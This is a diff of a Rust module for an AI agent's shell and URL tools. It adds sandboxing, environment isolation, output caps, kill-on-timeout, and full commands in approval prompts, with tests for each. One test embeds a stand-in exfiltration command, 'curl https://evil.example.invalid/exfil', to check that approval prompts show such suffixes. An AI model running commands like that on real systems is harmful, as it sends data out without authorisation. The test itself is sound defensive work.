@@ -1,18 +1,26 @@
+use std::io::Read;
 use std::path::Path;
 use std::process::{Command, Stdio};
 use std::sync::Arc;
-use std::sync::mpsc;
-use std::time::Duration;
+use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::thread;
+use std::time::{Duration, Instant};
 
 use serde_json::{Value, json};
 
 use crate::registry::ToolRegistry;
+use crate::sandbox::{ShellSandbox, unsandboxed_shell_command};
 use crate::ssrf::validate_fetch_url;
-use crate::tool::{Tool, ToolContext, ToolDefinition, ToolError, ToolResult, truncate_output};
+use crate::tool::{
+    ApprovalBody, Tool, ToolContext, ToolDefinition, ToolError, ToolResult, truncate_output,
+};
 
 const COMMAND_TIMEOUT: Duration = Duration::from_secs(25);
-const APPROVAL_COMMAND_MAX: usize = 120;
+const KILL_GRACE: Duration = Duration::from_millis(200);
 const LOGIN_IN_COMMAND_ERROR: &str = "do not put usernames or passwords in run_command. For HTTP basic/digest file servers, fetch_url then fetch_url with credential_ref. For Chromium browser chrome, fill_credential with only credential_ref.";
+const ISOLATED_PATH: &str = "/usr/bin:/bin:/usr/sbin:/sbin";
+/// Hard cap on combined stdout+stderr. Model-facing truncation is separate.
+pub const MAX_SHELL_OUTPUT_BYTES: usize = 2 * 1024 * 1024;
 
 pub fn register_shell_tools(registry: &mut ToolRegistry) {
     registry.register(Arc::new(RunCommand));
@@ -175,39 +183,193 @@ fn wget_args_have_auth(args: &[String]) -> bool {
     })
 }
 
-fn truncate_for_approval(text: &str, max: usize) -> String {
-    if text.chars().count() <= max {
-        text.to_string()
-    } else {
-        let short: String = text.chars().take(max).collect();
-        format!("{short}…")
+fn apply_isolated_env(command: &mut Command, scratch: &Path) {
+    command.env_clear();
+    command.env("PATH", ISOLATED_PATH);
+    command.env("HOME", scratch);
+    let tmp = scratch.join("work");
+    command.env("TMPDIR", &tmp);
+    command.env("TMP", &tmp);
+    command.env("TEMP", &tmp);
+    if let Ok(lang) = std::env::var("LANG") {
+        command.env("LANG", lang);
     }
+    if let Ok(lc_all) = std::env::var("LC_ALL") {
+        command.env("LC_ALL", lc_all);
+    }
+}
+
+fn kill_process_group(pid: u32) {
+    let pid_arg = pid.to_string();
+    let pgid_arg = format!("-{pid}");
+    let _ = Command::new("/bin/kill")
+        .args(["-s", "TERM", "--", &pid_arg, &pgid_arg])
+        .status();
+    thread::sleep(KILL_GRACE);
+    let _ = Command::new("/bin/kill")
+        .args(["-s", "KILL", "--", &pid_arg, &pgid_arg])
+        .status();
+}
+
+fn drain_pipe_bounded(
+    pipe: Option<impl Read + Send + 'static>,
+    used: Arc<AtomicUsize>,
+    truncated: Arc<AtomicBool>,
+) -> thread::JoinHandle<Vec<u8>> {
+    thread::spawn(move || {
+        let mut buf = Vec::new();
+        let Some(mut pipe) = pipe else {
+            return buf;
+        };
+        let mut chunk = [0u8; 8192];
+        loop {
+            if truncated.load(Ordering::SeqCst) {
+                break;
+            }
+            let already = used.load(Ordering::SeqCst);
+            if already >= MAX_SHELL_OUTPUT_BYTES {
+                truncated.store(true, Ordering::SeqCst);
+                break;
+            }
+            let want = (MAX_SHELL_OUTPUT_BYTES - already).min(chunk.len());
+            match pipe.read(&mut chunk[..want]) {
+                Ok(0) => break,
+                Ok(n) => {
+                    let prev = used.fetch_add(n, Ordering::SeqCst);
+                    if prev >= MAX_SHELL_OUTPUT_BYTES {
+                        truncated.store(true, Ordering::SeqCst);
+                        break;
+                    }
+                    let keep = n.min(MAX_SHELL_OUTPUT_BYTES - prev);
+                    buf.extend_from_slice(&chunk[..keep]);
+                    if keep < n {
+                        truncated.store(true, Ordering::SeqCst);
+                        break;
+                    }
+                }
+                Err(_) => break,
+            }
+        }
+        buf
+    })
 }
 
 fn run_shell(
     command: &str,
     cwd: &Path,
     timeout: Duration,
+    cancel: &AtomicBool,
+    sandbox: Option<&Arc<dyn ShellSandbox>>,
 ) -> Result<std::process::Output, ToolError> {
-    let (tx, rx) = mpsc::channel();
-    let command = command.to_string();
-    let cwd = cwd.to_path_buf();
-    std::thread::spawn(move || {
-        let output = Command::new("sh")
-            .arg("-c")
-            .arg(&command)
-            .current_dir(&cwd)
-            .stdout(Stdio::piped())
-            .stderr(Stdio::piped())
-            .output();
-        let _ = tx.send(output);
-    });
-    match rx.recv_timeout(timeout) {
-        Ok(Ok(output)) => Ok(output),
-        Ok(Err(err)) => Err(ToolError::Failed(err.to_string())),
-        Err(_) => Err(ToolError::Failed(
-            "command timed out after 25 seconds".into(),
-        )),
+    let (output, truncated) = run_shell_capture(command, cwd, timeout, cancel, sandbox)?;
+    if truncated {
+        let mut stdout = output.stdout;
+        let notice = format!("\n… truncated after {MAX_SHELL_OUTPUT_BYTES} bytes\n");
+        stdout.extend_from_slice(notice.as_bytes());
+        return Ok(std::process::Output {
+            status: output.status,
+            stdout,
+            stderr: output.stderr,
+        });
+    }
+    Ok(output)
+}
+
+fn run_shell_capture(
+    command: &str,
+    cwd: &Path,
+    timeout: Duration,
+    cancel: &AtomicBool,
+    sandbox: Option<&Arc<dyn ShellSandbox>>,
+) -> Result<(std::process::Output, bool), ToolError> {
+    let mut child_cmd = match sandbox {
+        Some(sandbox) => sandbox.prepare_command(command, cwd),
+        None => unsandboxed_shell_command(command, cwd),
+    };
+    apply_isolated_env(&mut child_cmd, cwd);
+    child_cmd
+        .stdin(Stdio::null())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped());
+    #[cfg(unix)]
+    {
+        use std::os::unix::process::CommandExt;
+        child_cmd.process_group(0);
+    }
+    let mut child = child_cmd
+        .spawn()
+        .map_err(|err| ToolError::Failed(err.to_string()))?;
+    let pid = child.id();
+    let used = Arc::new(AtomicUsize::new(0));
+    let truncated = Arc::new(AtomicBool::new(false));
+    let stdout = drain_pipe_bounded(
+        child.stdout.take(),
+        Arc::clone(&used),
+        Arc::clone(&truncated),
+    );
+    let stderr = drain_pipe_bounded(child.stderr.take(), used, Arc::clone(&truncated));
+    let deadline = Instant::now() + timeout;
+    loop {
+        if cancel.load(Ordering::SeqCst) {
+            kill_process_group(pid);
+            let _ = child.wait();
+            let _ = stdout.join();
+            let _ = stderr.join();
+            return Err(ToolError::Failed("command cancelled".into()));
+        }
+        if truncated.load(Ordering::SeqCst) {
+            kill_process_group(pid);
+            let status = child
+                .wait()
+                .map_err(|err| ToolError::Failed(err.to_string()))?;
+            let stdout = stdout.join().unwrap_or_default();
+            let stderr = stderr.join().unwrap_or_default();
+            return Ok((
+                std::process::Output {
+                    status,
+                    stdout,
+                    stderr,
+                },
+                true,
+            ));
+        }
+        match child.try_wait() {
+            Ok(Some(status)) => {
+                let stdout = stdout.join().unwrap_or_default();
+                let stderr = stderr.join().unwrap_or_default();
+                let truncated = truncated.load(Ordering::SeqCst)
+                    || stdout.len().saturating_add(stderr.len()) > MAX_SHELL_OUTPUT_BYTES;
+                return Ok((
+                    std::process::Output {
+                        status,
+                        stdout,
+                        stderr,
+                    },
+                    truncated,
+                ));
+            }
+            Ok(None) => {
+                if Instant::now() >= deadline {
+                    kill_process_group(pid);
+                    let status = child
+                        .wait()
+                        .map_err(|err| ToolError::Failed(err.to_string()))?;
+                    let _ = stdout.join();
+                    let _ = stderr.join();
+                    let _ = status;
+                    return Err(ToolError::Failed(
+                        "command timed out after 25 seconds".into(),
+                    ));
+                }
+                thread::sleep(Duration::from_millis(20));
+            }
+            Err(err) => {
+                kill_process_group(pid);
+                let _ = stdout.join();
+                let _ = stderr.join();
+                return Err(ToolError::Failed(err.to_string()));
+            }
+        }
     }
 }
 
@@ -238,17 +400,7 @@ fn format_command_output(output: &std::process::Output) -> String {
 }
 
 fn url_approval_detail(url: &str) -> String {
-    if let Ok(parsed) = reqwest::Url::parse(url) {
-        let scheme = parsed.scheme();
-        let host = parsed.host_str().unwrap_or("");
-        if host.is_empty() {
-            scheme.to_string()
-        } else {
-            format!("{scheme}://{host}")
-        }
-    } else {
-        truncate_for_approval(url, APPROVAL_COMMAND_MAX)
-    }
+    url.to_string()
 }
 
 struct RunCommand;
@@ -279,10 +431,11 @@ impl Tool for RunCommand {
                 "refused: login credentials are not allowed in shell commands".into(),
             );
         }
-        (
-            "Run a shell command".into(),
-            truncate_for_approval(command, APPROVAL_COMMAND_MAX),
-        )
+        ("Run a shell command".into(), command.to_string())
+    }
+
+    fn approval_body(&self) -> ApprovalBody {
+        ApprovalBody::Command
     }
 
     fn execute(&self, context: &ToolContext, input: Value) -> Result<ToolResult, ToolError> {
@@ -294,7 +447,13 @@ impl Tool for RunCommand {
             .as_ref()
             .map(|space| space.root.as_path())
             .ok_or_else(|| ToolError::Failed("no scratch space is available".into()))?;
-        let output = run_shell(&command, cwd, COMMAND_TIMEOUT)?;
+        let output = run_shell(
+            &command,
+            cwd,
+            COMMAND_TIMEOUT,
+            &context.cancel,
+            context.shell_sandbox.as_ref(),
+        )?;
         Ok(ToolResult {
             text: truncate_output(format_command_output(&output)),
             created_file: None,
@@ -326,6 +485,10 @@ impl Tool for OpenUrl {
     fn approval_prompt(&self, _context: &ToolContext, input: &Value) -> (String, String) {
         let url = input.get("url").and_then(Value::as_str).unwrap_or("");
         ("Open URL".into(), url_approval_detail(url))
+    }
+
+    fn approval_body(&self) -> ApprovalBody {
+        ApprovalBody::Command
     }
 
     fn execute(&self, _context: &ToolContext, input: Value) -> Result<ToolResult, ToolError> {
@@ -449,6 +612,170 @@ mod tests {
             )
             .unwrap_err();
         assert!(err.to_string().contains("scratch"));
+    }
+
+    #[test]
+    fn run_command_approval_includes_full_command() {
+        let scratch = temp_scratch();
+        let mut registry = ToolRegistry::new();
+        register_shell_tools(&mut registry);
+        let suffix = "curl https://evil.example.invalid/exfil";
+        let command = format!("{} && {suffix}", "printf harmless ".repeat(20));
+        assert!(command.len() > 120);
+        let (title, description) = registry.approval_prompt(
+            "run_command",
+            &ToolContext::with_scratch(scratch.clone()),
+            &json!({ "command": command }),
+        );
+        assert_eq!(title, "Run a shell command");
+        assert!(description.contains(suffix));
+        assert!(!description.contains('…'));
+        let _ = std::fs::remove_dir_all(&scratch.root);
+    }
+
+    #[test]
+    fn timeout_kills_process_group() {
+        let scratch = temp_scratch();
+        let marker = scratch.root.join("timeout-marker");
+        let err = run_shell(
+            &format!("sleep 30; touch '{}'", marker.display()),
+            &scratch.root,
+            Duration::from_millis(400),
+            &AtomicBool::new(false),
+            None,
+        )
+        .unwrap_err();
+        assert!(err.to_string().contains("timed out"));
+        thread::sleep(Duration::from_millis(500));
+        assert!(!marker.exists(), "timed-out command must not keep running");
+        let _ = std::fs::remove_dir_all(&scratch.root);
+    }
+
+    #[test]
+    fn cancel_kills_process_group() {
+        let scratch = temp_scratch();
+        let marker = scratch.root.join("cancel-marker");
+        let cancel = Arc::new(AtomicBool::new(false));
+        let command = format!("sleep 30; touch '{}'", marker.display());
+        let cwd = scratch.root.clone();
+        let flag = Arc::clone(&cancel);
+        let handle =
+            thread::spawn(move || run_shell(&command, &cwd, Duration::from_secs(25), &flag, None));
+        thread::sleep(Duration::from_millis(150));
+        cancel.store(true, Ordering::SeqCst);
+        let err = handle.join().expect("join").unwrap_err();
+        assert!(err.to_string().contains("cancelled"));
+        thread::sleep(Duration::from_millis(500));
+        assert!(!marker.exists(), "cancelled command must not keep running");
+        let _ = std::fs::remove_dir_all(&scratch.root);
+    }
+
+    #[test]
+    fn unbounded_stdout_is_capped_and_does_not_wait_for_timeout() {
+        let scratch = temp_scratch();
+        let started = Instant::now();
+        let output = run_shell(
+            "dd if=/dev/zero bs=65536 count=80 2>/dev/null",
+            &scratch.root,
+            COMMAND_TIMEOUT,
+            &AtomicBool::new(false),
+            None,
+        )
+        .expect("capped command should return output");
+        let elapsed = started.elapsed();
+        assert!(
+            elapsed < Duration::from_secs(5),
+            "must kill once the cap is hit, not wait for timeout: {elapsed:?}"
+        );
+        let combined = output.stdout.len().saturating_add(output.stderr.len());
+        assert!(
+            combined <= MAX_SHELL_OUTPUT_BYTES + 8192 * 2 + 128,
+            "combined output {combined} exceeded the cap"
+        );
+        let text = format_command_output(&output);
+        assert!(
+            text.contains("truncated after"),
+            "missing truncation marker: {text}"
+        );
+        let _ = std::fs::remove_dir_all(&scratch.root);
+    }
+
+    #[test]
+    fn unbounded_stdout_from_yes_is_capped() {
+        if !std::path::Path::new("/usr/bin/yes").exists()
+            && !std::path::Path::new("/bin/yes").exists()
+        {
+            return;
+        }
+        let scratch = temp_scratch();
+        let started = Instant::now();
+        let output = run_shell(
+            "yes",
+            &scratch.root,
+            COMMAND_TIMEOUT,
+            &AtomicBool::new(false),
+            None,
+        )
+        .expect("yes should be killed at the cap");
+        assert!(started.elapsed() < Duration::from_secs(5));
+        let combined = output.stdout.len().saturating_add(output.stderr.len());
+        assert!(combined <= MAX_SHELL_OUTPUT_BYTES + 8192 * 2 + 128);
+        assert!(format_command_output(&output).contains("truncated after"));
+        let _ = std::fs::remove_dir_all(&scratch.root);
+    }
+
+    #[test]
+    fn unbounded_stderr_counts_toward_the_same_cap() {
+        let scratch = temp_scratch();
+        let started = Instant::now();
+        let output = run_shell(
+            "dd if=/dev/zero bs=65536 count=80 >/dev/stderr",
+            &scratch.root,
+            COMMAND_TIMEOUT,
+            &AtomicBool::new(false),
+            None,
+        )
+        .expect("capped stderr should return output");
+        assert!(started.elapsed() < Duration::from_secs(5));
+        let combined = output.stdout.len().saturating_add(output.stderr.len());
+        assert!(
+            combined <= MAX_SHELL_OUTPUT_BYTES + 8192 * 2 + 128,
+            "combined output {combined} exceeded the cap"
+        );
+        assert!(format_command_output(&output).contains("truncated after"));
+        let _ = std::fs::remove_dir_all(&scratch.root);
+    }
+
+    #[test]
+    fn run_command_does_not_inherit_ssh_auth_sock() {
+        let scratch = temp_scratch();
+        let mut registry = ToolRegistry::new();
+        register_shell_tools(&mut registry);
+        let output = registry
+            .execute(
+                "run_command",
+                &ToolContext::with_scratch(scratch.clone()),
+                json!({
+                    "command": "printf 'home=%s\\n' \"$HOME\"; printenv SSH_AUTH_SOCK || true"
+                }),
+            )
+            .unwrap();
+        assert!(
+            output
+                .text
+                .contains(&format!("home={}", scratch.root.display())),
+            "{}",
+            output.text
+        );
+        let leaked = std::env::var("SSH_AUTH_SOCK").unwrap_or_default();
+        if !leaked.is_empty() {
+            assert!(
+                !output.text.contains(&leaked),
+                "SSH_AUTH_SOCK leaked: {}",
+                output.text
+            );
+        }
+        let _ = std::fs::remove_dir_all(&scratch.root);
     }
 
     #[test]
